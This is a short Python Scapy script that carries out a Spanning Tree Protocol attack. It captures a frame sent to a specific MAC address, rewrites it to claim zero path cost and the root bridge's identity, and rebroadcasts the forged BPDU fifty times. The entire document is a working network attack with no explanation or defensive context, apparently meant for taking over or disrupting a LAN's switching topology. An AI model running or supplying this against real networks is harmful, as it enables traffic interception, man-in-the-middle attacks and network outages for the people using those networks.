from scapy.all import *

#capture STP frame
pkt = sniff(filter="ether dst cc:32:e5:0d:9f:d5", count=1)

#Block port to root switch
#set cost to root to zero
pkt[0].pathcost = 0

#Set bridge MAC to root bridge
pkt[0].bridgemac = pkt[0].rootmac

#Set port ID to 1
pkt[0].portid = 1

#Loop to send multiple BPDUs
for i in range(0,50):
    pkt[0].show()
    sendp(pkt[0], loop=0, verbose=1)
    time.sleep(1)
